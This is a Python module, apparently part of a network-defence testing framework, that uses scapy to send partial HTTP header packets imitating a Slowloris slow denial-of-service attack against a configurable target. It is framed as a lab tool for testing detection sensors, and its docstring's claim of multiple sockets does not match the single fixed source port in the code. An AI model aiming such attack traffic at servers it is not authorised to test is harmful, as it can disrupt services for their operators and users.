from core.module_base import ModuleBase
from scapy.all import IP, TCP, Raw, send
import time


class SlowlorisPayloadGenerator(ModuleBase):
    """
    Simulated Low-Rate Slowloris Connection Generator.
    Emits periodic partial HTTP request headers (X-a: b) across multiple sockets
    in a safe laboratory setup to test low-and-slow DoS sentinels.
    """

    def __init__(self, session):
        super().__init__(session)
        self.options = {
            "TARGET": {"value": "127.0.0.1", "required": True, "desc": "Target web server IP"},
            "PORT": {"value": "80", "required": True, "desc": "Target web server port"},
            "COUNT": {"value": "4", "required": True, "desc": "Number of partial header packets"},
        }

    def run(self):
        target = self.options["TARGET"]["value"]
        port = int(self.options["PORT"]["value"])
        count = int(self.options["COUNT"]["value"])

        print(f"[*] Emitting {count} slow HTTP partial header probes to {target}:{port}...")

        try:
            # 1. Partial GET header
            init_req = f"GET /?ands_test={time.time()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: ANDS-Slowloris/2.0\r\n".encode()
            pkt1 = IP(dst=target) / TCP(sport=54301, dport=port, flags="PA") / Raw(load=init_req)
            send(pkt1, verbose=0)
            print("  [>] Initialized partial HTTP request")

            # 2. Emit keep-alive headers
            for i in range(1, count):
                time.sleep(0.5)
                hdr = f"X-KeepAlive-{i}: {time.time()}\r\n".encode()
                pkt = IP(dst=target) / TCP(sport=54301, dport=port, flags="PA") / Raw(load=hdr)
                send(pkt, verbose=0)
                print(f"  [>] Transmitted slow partial header [{i}/{count-1}]")

        except PermissionError:
            print("[-] Permission denied. Run ANDS with sudo.")
            return
        except KeyboardInterrupt:
            print("\n[*] Slowloris simulation stopped.")

        print(f"[+] Slow HTTP test simulation complete.")
